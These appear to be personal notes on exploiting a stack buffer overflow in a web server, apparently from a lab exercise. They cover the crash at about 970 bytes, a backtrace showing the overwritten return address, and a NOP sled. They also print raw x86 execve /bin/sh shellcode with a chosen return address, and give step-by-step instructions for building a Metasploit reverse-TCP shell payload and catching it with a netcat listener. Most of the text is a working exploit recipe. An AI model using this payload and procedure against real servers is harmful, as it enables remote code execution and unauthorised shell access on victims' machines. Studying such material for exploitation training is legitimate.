The web server crashes at around 970 characters with a segmentation fault.

The following bt was created by sending ABCD repeated 1000 times to the server
Running a backtrace on the core file shows the following:
#0 0x4207beac in ??
#1 0x4204a315 in ??
#2 0x42064e1c in ??
#3 0x4205243d in ??
#4 0x0804890f in ??
#5 0x44434241 in ??
Cannot access memory at address 0x44434241


Hit the return address with the following:
NOP='\x90'x 100
SHC='ABCD'x  180 (will need to be replaced by the exploit)
ADDR='WXYZ' x 300

EGG=$NOP$SHC$ADDR

Possible return address in the middle of NOP region: 0xbffff720

I believe I got this to return a shell (though there is no listener so not received) with the following:
NOP=`perl -e "print '\x90'x99"`
SHC="\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
ADDR=`perl -e "print '\x20\xf7\xff\xbf'x300"`
EGG=$NOP$SHC$ADDR
EGG=$(echo -e $EGG)

I got this to work and return a reverse shell. Steps to reproduce:
Create NOP sled with 98 '\x90'
Create a payload using metasploit with shellcode /linux/x86/shell_reverse_tcp and x86/alpha_mixed encoder
Set the LHOST to current IP and RHOST to victim IP
Set LPORT to nc listener port and RPORT to server port
Generate the payload
Create Address as above
Setup netcat listener nc -l -p LPORT -nvv
Create payload as $NOP$SHC$ADDR and send to server
